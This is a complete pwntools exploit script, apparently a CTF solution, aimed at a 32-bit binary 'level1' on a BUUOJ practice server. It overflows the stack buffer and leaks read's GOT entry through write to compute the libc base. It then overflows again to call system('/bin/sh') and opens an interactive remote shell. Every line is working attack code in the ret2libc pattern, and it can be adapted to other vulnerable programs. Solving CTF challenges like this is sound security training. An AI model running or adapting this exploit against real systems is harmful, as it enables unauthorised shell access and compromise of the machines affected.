from pwn import *
context(log_level='debug')
#io = process("./level1")
elf = ELF("./level1")
libc = ELF("./libc-2.23.so")
io = remote("node4.buuoj.cn",29905)
payload = (0x88+4)*'a' + p32(elf.plt['write'])+p32(elf.sym['main'])+p32(1)+p32(elf.got['read'])+p32(4)
io.sendline(payload)
read = u32(io.recv(4))
base = read - libc.sym['read']
system_add = base + libc.sym['system']
bin_sh = base + libc.search('/bin/sh').next()
payload = (0x88+4)*'a' + p32(system_add) + p32(0xdeadbeef) + p32(bin_sh)
io.sendline(payload)
io.interactive()